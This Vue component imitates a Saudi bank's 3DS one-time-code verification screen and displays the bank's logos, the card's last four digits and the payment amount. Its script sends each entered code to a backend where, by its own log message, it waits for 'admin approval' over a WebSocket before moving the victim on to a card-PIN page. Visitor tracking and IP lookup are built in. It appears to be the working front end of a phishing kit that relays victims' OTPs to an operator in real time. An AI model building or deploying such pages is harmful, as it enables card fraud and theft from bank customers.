<template>
    <!-- ═══ SNB 3DS-style OTP Verification ═══ -->
    <div class="tds-shell" dir="rtl">

        <div class="tds-card" :class="{ 'tds-card--busy': isVerifying && !error }">

            <!-- Processing overlay -->
            <Transition name="verify-fade">
                <div v-if="isVerifying && !error" class="tds-overlay">
                    <img :src="loadingGif" alt="" class="tds-overlay__gif" />
                    <p class="tds-overlay__text">جاري التحقق...</p>
                </div>
            </Transition>

            <!-- Branding header -->
            <div v-if="hasAnyBranding" class="tds-header">
                <div class="tds-header__slot tds-header__slot--left">
                    <img
                        v-if="displayNetworkLogo"
                        :src="displayNetworkLogo"
                        :alt="displayNetworkName"
                        class="tds-header__logo tds-header__logo--network"
                    />
                    <div v-else class="tds-header__placeholder" aria-hidden="true"></div>
                </div>
                <div class="tds-header__center" aria-hidden="true"></div>
                <div class="tds-header__slot tds-header__slot--right">
                    <img
                        v-if="displayBankLogo"
                        :src="displayBankLogo"
                        :alt="displayBankName"
                        class="tds-header__logo tds-header__logo--bank"
                    />
                    <div v-else class="tds-header__placeholder" aria-hidden="true"></div>
                </div>
            </div>

            <!-- Error -->
            <div v-if="error" id="ErrorMessage" class="tds-error">{{ error }}</div>

            <!-- Title -->
            <h1 class="tds-title">التحقق عبر الجوال</h1>

            <!-- Info -->
            <div class="tds-info">
                تم إرسال رمز تحقق إلى رقم جوالك المسجل لدى البنك.
                <br />
                أنت تدفع مبلغ <strong>SAR {{ formattedAmount }}</strong>
                <br />
                باستخدام البطاقة المنتهية برقم
                <strong id="cardLast4">{{ cardLast4 }}</strong>
            </div>

            <!-- Expired message -->
            <div v-if="codeExpired" class="tds-expired">
                انتهت صلاحية الرمز — اطلب رمزًا جديدًا
            </div>

            <!-- OTP Input -->
            <div class="tds-field">
                <label for="PaymentCode" class="tds-field__label">رمز التحقق</label>
                <input
                    id="PaymentCode"
                    v-model="otpCode"
                    type="text"
                    inputmode="numeric"
                    pattern="[0-9]*"
                    name="one-time-code"
                    maxlength="6"
                    minlength="4"
                    enterkeyhint="done"
                    autocapitalize="off"
                    autocorrect="off"
                    spellcheck="false"
                    :disabled="isVerifying || codeExpired"
                    placeholder="أدخل رمز التحقق"
                    class="tds-field__input"
                    autocomplete="one-time-code"
                    @input="handleOtpInput"
                    @paste="handleOtpPaste"
                />
            </div>

            <!-- Timer -->
            <div class="tds-timer" :class="{ 'tds-timer--urgent': expiryUrgent }">
                ينتهي الرمز خلال
                <span id="otptimeout" class="tds-timer__value">{{ formattedExpiry }}</span>
            </div>

            <!-- Confirm -->
            <button
                id="pay_code_submit"
                type="button"
                :disabled="!isOtpValid || isVerifying || codeExpired"
                class="tds-btn tds-btn--primary"
                @click="submitOtp"
            >
                CONFIRM
            </button>

            <!-- Resend -->
            <button
                v-if="resendTimer <= 0 || codeExpired"
                type="button"
                :disabled="isResending"
                class="tds-btn tds-btn--secondary"
                @click="resendOtp"
            >
                {{ isResending ? 'جاري الإرسال...' : 'RESEND CODE' }}
            </button>
        </div>

        <!-- Cancel -->
        <button type="button" class="tds-cancel" @click="$router.replace( { name: 'checkout' } )">
            CANCEL
        </button>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackOtpRequested, trackOtpResent, trackOtpExpired, trackOtpVerified, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getOtpStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
// InsLoading replaced with in-card verify overlay
import { useCardBranding } from '@/composables/useCardBranding';
import { getReasonLabel } from '@/constants/rejectionReasons';
import loadingGif from '@/../../resources/images/logo/banks/loading.gif';

// ─── Order data (transaction context for trust signals) ─────────────
const orderData = (() => {
    try { return JSON.parse( sessionStorage.getItem( 'orderData' ) || '{}' ); }
    catch { return {}; }
})();
const _merchantName = computed( () => orderData?.plan?.companyName || 'تأمينكم' );

const { t } = useI18n();
const router = useRouter();

// ─── Visitor tracking ───────────────────────────────────────────────
useVisitorTracking( 'otp' );

// ─── Session context via composable (computed to preserve reactivity) ───
const { context, resolveCustomerIp, submitOtp: submitOtpApi, resendOtpCode, error: paymentError } = usePayment();
const sessionId = computed( () => context.sessionId || '' );
const customerIpRef = ref( context.customerIp || '' );
const cardBin = computed( () => context.cardBin || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const _cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

// ─── Card branding (network + bank) ────────────────────────────────
const { brand, networkLogo, networkName, bankLogo, bankName } = useCardBranding( cardBin );

const displayBankLogo = computed( () => bankLogo.value || null );
const displayNetworkLogo = computed( () => networkLogo.value || null );
const displayBankName = computed( () => bankName.value || 'البنك' );
const displayNetworkName = computed( () => networkName.value || brand.value || 'Card' );
const hasAnyBranding = computed( () => Boolean( displayBankLogo.value || displayNetworkLogo.value ) );

const RESEND_COOLDOWN = 180; // seconds
const CODE_EXPIRY = 300; // 5 minutes fallback

const formattedAmount = computed( () =>
    totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } )
);

// ─── OTP State ──────────────────────────────────────────────────────
const otpCode = ref( '' );
const otpInputRef = ref( null );
const isVerifying = ref( false );
const isResending = ref( false );
const lastResendAt = ref( 0 );
const error = ref( '' );
const resendTimer = ref( RESEND_COOLDOWN );
let timerInterval = null;

// ─── Code Expiry Timer (server-synced via expires_at) ───────────────
const codeExpiry = ref( CODE_EXPIRY );
let expiryInterval = null;
const codeExpired = computed( () => codeExpiry.value <= 0 );
const expiryUrgent = computed( () => codeExpiry.value > 0 && codeExpiry.value <= 30 );

const formattedExpiry = computed( () =>
{
    const m = Math.floor( codeExpiry.value / 60 );
    const s = codeExpiry.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

function startExpiryTimer ()
{
    if ( expiryInterval ) clearInterval( expiryInterval );

    // Use server's expires_at if available (survives route re-entry + tab switching)
    const serverExpiry = context.otpExpiresAt;
    if ( serverExpiry )
    {
        const remaining = Math.max( 0, Math.floor( ( new Date( serverExpiry ) - Date.now() ) / 1000 ) );
        codeExpiry.value = remaining;
    } else
    {
        codeExpiry.value = CODE_EXPIRY;
    }

    if ( codeExpiry.value <= 0 ) return;

    expiryInterval = setInterval( () =>
    {
        // Re-calculate from server timestamp each tick to prevent drift
        const serverExp = context.otpExpiresAt;
        if ( serverExp )
        {
            codeExpiry.value = Math.max( 0, Math.floor( ( new Date( serverExp ) - Date.now() ) / 1000 ) );
        } else
        {
            codeExpiry.value = Math.max( 0, codeExpiry.value - 1 );
        }

        if ( codeExpiry.value <= 0 )
        {
            clearInterval( expiryInterval );
            trackOtpExpired();
        }
    }, 1000 );
}

const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );

function extractOtpCode ( raw )
{
    const text = String( raw || '' );

    // Prefer exact standalone 4-6 digit OTP tokens first
    const token = text.match( /(?:^|\D)(\d{4,6})(?:\D|$)/ );
    if ( token?.[1] ) return token[1];

    // Fallback: collect all digits and trim to max 6
    const digits = text.replace( /\D/g, '' );
    return digits.slice( 0, 6 );
}

function handleOtpInput ( event )
{
    otpCode.value = extractOtpCode( event?.target?.value );
}

function handleOtpPaste ( event )
{
    const pasted = event?.clipboardData?.getData( 'text' ) || '';
    const extracted = extractOtpCode( pasted );
    if ( extracted ) {
        event.preventDefault();
        otpCode.value = extracted;
    }
}

const _formattedTimer = computed( () =>
{
    const m = Math.floor( resendTimer.value / 60 );
    const s = resendTimer.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

const _timerPercent = computed( () =>
    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
);

function startResendTimer ()
{
    if ( timerInterval ) clearInterval( timerInterval );
    resendTimer.value = RESEND_COOLDOWN;
    timerInterval = setInterval( () =>
    {
        if ( resendTimer.value > 0 )
        {
            resendTimer.value--;
        } else
        {
            clearInterval( timerInterval );
        }
    }, 1000 );
}

// ─── Submit OTP ─────────────────────────────────────────────────────
const submitOtp = async () =>
{
    if ( !isOtpValid.value || isVerifying.value ) return;

    isVerifying.value = true;
    error.value = '';

    const success = await submitOtpApi( otpCode.value );

    if ( !success )
    {
        error.value = paymentError.value || t( 'verification.otp.sendCodeError' );
        isVerifying.value = false;
    } else
    {
        logger.debug( '[OTP] Submitted successfully, waiting for admin approval' );
    }
};

// ─── Resend OTP ─────────────────────────────────────────────────────
const resendOtp = async () =>
{
    if ( isResending.value ) return;
    if ( Date.now() - lastResendAt.value < 10000 ) return; // 10s minimum between resends
    if ( resendTimer.value > 0 && !codeExpired.value ) return;

    isResending.value = true;
    lastResendAt.value = Date.now();
    error.value = '';

    const success = await resendOtpCode();

    if ( success )
    {
        otpCode.value = '';
        otpInputRef.value?.clear();
        isVerifying.value = false;     // unlock input after fresh code is issued
        error.value = '';              // clear any stale error
        codeExpiry.value = CODE_EXPIRY; // immediately reset — don't wait for startExpiryTimer
        startResendTimer();
        startExpiryTimer();
        trackOtpResent();
        logger.debug( '[OTP] Resend success — codeExpiry reset to', CODE_EXPIRY );
    } else
    {
        error.value = t( 'verification.otp.resendError' );
        resendTimer.value = 0; // keep resend button visible so user can retry
    }

    isResending.value = false;
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',
    approvedEvent: 'OtpApproved',
    rejectedEvent: 'OtpRejected',
    logTag: 'OTP',

    onApproved ( event )
    {
        logger.debug( '[OTP] Approved:', event );
        isVerifying.value = false;
        trackOtpVerified();
        trackStepCompleted( 'otp', 'card_pin' );

        // Defer navigation via microtask to release the WS message handler
        queueMicrotask( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'cardPin', router );
            } else
            {
                router.push( { name: 'cardPin' } );
            }
        } );
    },

    onRejected ( event )
    {
        logger.debug( '[OTP] Rejected:', event );
        isVerifying.value = false;

        // Card-redirect reasons → send user back to checkout with error
        const cardRedirectReasons = [ 'otp_ewallet_not_accepted', 'otp_card_change_required' ];
        if ( cardRedirectReasons.includes( event.reason ) )
        {
            router.replace( { name: 'checkout', query: { rejectionReason: event.reason } } );
            return;
        }

        error.value = getReasonLabel( event.reason, t ) || t( 'verification.otp.codeRejected' );
        otpCode.value = '';
        otpInputRef.value?.clear();
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.otp || '';
        if ( !isVerifying.value || !sessionId.value || !sig ) return;

        const { data } = await getOtpStatus( sessionId.value, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( { redirect_to: null } );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'otp_other' } );
        } else if ( data.status === 'expired' )
        {
            // Server confirms expiry — trigger the same path as the local timer
            handleRejected( { reason: 'otp_expired' } );
        }
    },
} );

// ─── WebOTP API — auto-fill from SMS ────────────────────────────────
let abortController = null;
let webOtpRequested = false;

async function initWebOTP ()
{
    if ( webOtpRequested ) return;
    if ( !( 'OTPCredential' in window ) ) return;

    webOtpRequested = true;

    try
    {
        abortController = new AbortController();
        const content = await navigator.credentials.get( {
            otp: { transport: [ 'sms' ] },
            signal: abortController.signal,
        } );

        if ( content?.code )
        {
            const code = extractOtpCode( content.code );
            otpCode.value = code;
        }
    } catch
    {
        // User cancelled or not supported — silent
    }
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    otpInputRef.value?.focusFirstEmpty();
    startResendTimer();
    startExpiryTimer();
    setupWs( sessionId.value );
    initWebOTP();
    trackStepViewed( 'otp' );
    trackOtpRequested();
} );

onUnmounted( () =>
{
    if ( timerInterval ) clearInterval( timerInterval );
    if ( expiryInterval ) clearInterval( expiryInterval );
    if ( abortController ) abortController.abort();
    // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
} );
</script>

<style scoped>
/* ═══ OtpPage — SNB Bank 3DS Style ═══ */

.tds-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 1rem;
    background: #f0f0f0;
    font-family: inherit;
}

/* ── Card ─────────────────────────────────────── */
.tds-card {
    position: relative;
    width: 100%;
    max-width: 420px;
    background: #fff;
    border-radius: 4px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
    overflow: hidden;
}

.tds-card--busy {
    pointer-events: none;
}

/* ── Processing overlay ──────────────────────── */
.tds-overlay {
    position: absolute;
    inset: 0;
    z-index: 20;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: rgba(255, 255, 255, 0.92);
    backdrop-filter: blur(4px);
    -webkit-backdrop-filter: blur(4px);
}

.tds-overlay__gif {
    width: 60px;
    height: 60px;
    margin-bottom: 0.75rem;
}

.tds-overlay__text {
    font-size: 14px;
    color: #333;
    font-weight: 600;
}

/* ── Branding header ─────────────────────────── */
.tds-header {
    display: grid;
    grid-template-columns: 110px 1fr 130px;
    align-items: center;
    gap: 12px;
    padding: 12px 20px;
    background: #e8f5f3;
    border-bottom: 1px solid #d4ece8;
}

.tds-header__slot {
    display: flex;
    align-items: center;
    min-width: 0;
}

.tds-header__slot--left {
    justify-content: flex-start;
}

.tds-header__slot--right {
    justify-content: flex-end;
}

.tds-header__center {
    min-width: 0;
}

.tds-header__logo {
    object-fit: contain;
    display: block;
}

.tds-header__logo--network {
    width: 64px;
    height: 26px;
}

.tds-header__logo--bank {
    width: 120px;
    height: 40px;
}

.tds-header__placeholder {
    width: 84px;
    height: 30px;
    visibility: hidden;
}

/* ── Error ────────────────────────────────────── */
.tds-error {
    padding: 10px 20px;
    background: #fef2f2;
    border-bottom: 1px solid #fca5a5;
    color: #dc2626;
    font-size: 14px;
    font-weight: 500;
}

/* ── Title ────────────────────────────────────── */
.tds-title {
    font-size: 18px;
    font-weight: 700;
    color: #1a1a1a;
    padding: 16px 20px 0;
    margin: 0;
}

/* ── Info ─────────────────────────────────────── */
.tds-info {
    padding: 10px 20px 16px;
    font-size: 14px;
    line-height: 1.8;
    color: #444;
}

/* ── Expired ─────────────────────────────────── */
.tds-expired {
    padding: 8px 20px;
    color: #dc2626;
    font-weight: 600;
    font-size: 14px;
}

/* ── Field ────────────────────────────────────── */
.tds-field {
    padding: 0 20px 12px;
}

.tds-field__label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    color: #333;
    margin-bottom: 6px;
}

.tds-field__input {
    width: 100%;
    padding: 10px 14px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 4px;
    direction: ltr;
    text-align: center;
    letter-spacing: 0.25em;
    box-sizing: border-box;
    transition: border-color 0.2s;
}

.tds-field__input:focus {
    outline: none;
    border-color: #1a5276;
    box-shadow: 0 0 0 2px rgba(26, 82, 118, 0.15);
}

.tds-field__input:disabled {
    background: #f5f5f5;
    cursor: not-allowed;
}

.tds-field__input::placeholder {
    font-size: 13px;
    letter-spacing: 0;
    color: #aaa;
}

/* ── Timer ────────────────────────────────────── */
.tds-timer {
    text-align: center;
    padding: 6px 20px 14px;
    font-size: 13px;
    color: #666;
}

.tds-timer__value {
    font-weight: 700;
    font-size: 15px;
    color: #1a5276;
    margin-right: 4px;
}

.tds-timer--urgent .tds-timer__value {
    color: #dc2626;
    animation: pulse-urgent 1s ease-in-out infinite;
}

@keyframes pulse-urgent {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

/* ── Buttons ─────────────────────────────────── */
.tds-btn {
    display: block;
    width: calc(100% - 40px);
    margin: 0 auto 10px;
    padding: 12px;
    font-size: 15px;
    font-weight: 700;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    text-align: center;
    transition: opacity 0.2s;
    letter-spacing: 0.05em;
}

.tds-btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

.tds-btn--primary {
    background: #1a5276;
    color: #fff;
}

.tds-btn--primary:hover:not(:disabled) {
    background: #154360;
}

.tds-btn--secondary {
    background: #e5e7eb;
    color: #374151;
    margin-bottom: 20px;
}

.tds-btn--secondary:hover:not(:disabled) {
    background: #d1d5db;
}

/* ── Cancel ───────────────────────────────────── */
.tds-cancel {
    display: block;
    margin-top: 12px;
    padding: 8px 20px;
    background: none;
    border: none;
    cursor: pointer;
    font-size: 14px;
    font-weight: 600;
    color: #dc2626;
    letter-spacing: 0.05em;
    transition: opacity 0.15s;
}

.tds-cancel:hover {
    opacity: 0.7;
}

/* ── Transition ──────────────────────────────── */
.verify-fade-enter-active,
.verify-fade-leave-active {
    transition: opacity 0.25s ease;
}

.verify-fade-enter-from,
.verify-fade-leave-to {
    opacity: 0;
}
</style>
